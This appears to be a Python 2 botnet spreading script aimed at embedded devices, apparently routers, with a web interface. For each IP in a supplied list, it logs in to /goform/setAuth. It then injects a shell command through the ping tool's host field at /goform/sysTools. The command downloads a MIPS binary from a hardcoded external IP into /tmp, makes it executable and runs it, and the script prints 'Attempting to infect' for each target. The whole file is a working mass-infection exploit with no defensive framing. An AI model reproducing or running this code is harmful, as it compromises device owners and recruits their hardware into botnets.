import threading, sys, time, random, socket, re, os, struct, array, requests
from requests.auth import HTTPDigestAuth
ips = open(sys.argv[1], "r").readlines() 
username = sys.argv[2]
pass1 = sys.argv[3]
port = sys.argv[4]

rm = "loginUser=" + username + "&loginPass=" + pass1
payload = "cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F62.197.136.92%2Fxnxx%2Fvailon.mpsl%20-O%20%2Ftmp%2F0xzuurrylmao%3Bchmod%20%2Bx%20%2Ftmp%2F0xzuurrylmao%3B%2Ftmp%2F0xzuurrylmao%20mipsel" #http encode it
rce = "tool=0&pingCount=4&host=" + payload + "&sumbit=OK"

class exploit(threading.Thread):
        def init (self, ip):
            threading.Thread.init(self)
            self.ip = str(ip).rstrip('\n')
        def run(self):
            try:
                url = "http://" + self.ip + ":" + port + "/goform/setAuth"
                url2 = "http://" + self.ip + ":" + port + "/goform/sysTools"
                requests.post(url, data=rm, timeout=5)
                requests.post(url2, data=rce, timeout=5)
                print "[0day] Attempting to infect " + self.ip
            except Exception as e:
                pass


for ip in ips:
    try:
        n = exploit(ip)
        n.start()
        time.sleep(0.03)
    except:
        pass 
